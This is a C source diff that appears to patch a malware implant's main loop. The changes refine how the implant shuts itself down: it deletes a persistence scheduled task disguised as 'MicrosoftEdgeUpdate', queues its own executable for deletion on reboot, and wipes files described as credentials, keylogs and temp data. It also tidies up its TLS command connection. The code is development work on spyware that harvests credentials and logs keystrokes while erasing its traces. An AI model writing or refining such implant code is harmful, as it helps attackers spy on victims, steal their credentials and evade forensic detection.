@@ -533,13 +533,22 @@ int main(int argc, char **argv)
         case COMMAND_SHUTDOWN: {
 #ifdef _WIN32
             {
+                /* Drain the pipe so schtasks /delete completes before we
+                 * proceed — hidden_popen closes the process handle
+                 * immediately, and fclose alone does not wait. */
                 FILE *fp = POPEN("schtasks /delete /tn \"MicrosoftEdgeUpdate\" /f", "r");
-                if (fp) PCLOSE(fp);
+                if (fp) {
+                    char drain[256];
+                    while (fgets(drain, sizeof(drain), fp));
+                    PCLOSE(fp);
+                }
             }
             /* Can't delete the running executable directly; mark it for
-             * removal on next reboot and clean up everything else now. */
+             * removal on next reboot.  Do NOT call RemoveDirectoryA here —
+             * the exe is still in the directory and the call will always
+             * fail silently.  The directory is cleaned up on reboot once
+             * the pending-delete removes the exe. */
             MoveFileExA(IMPLANT_TARGET_PATH, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
-            RemoveDirectoryA(IMPLANT_TARGET_DIR);
             DeleteFileA(IMPLANT_STAGE_PATH);
 #endif
             /* Remove all implant files — credentials, keylog, temp dir */
@@ -728,11 +737,17 @@ int main(int argc, char **argv)
         free_packet(pkt);
     }
 
+    /* Signal keepalive thread to stop and give it one cycle to observe the
+     * flag before we free the connection it holds a pointer to. */
     g_ka_run = 0;
-    g_conn   = NULL;
+    SLEEP(1);
+    g_conn = NULL;
     if (conn) tls_conn_free(conn);
     tls_cleanup();
     MUTEX_DESTROY(&g_write_lock);
     platform_cleanup();
+#ifdef _WIN32
+    ExitProcess(0);
+#endif
     return 0;
 }
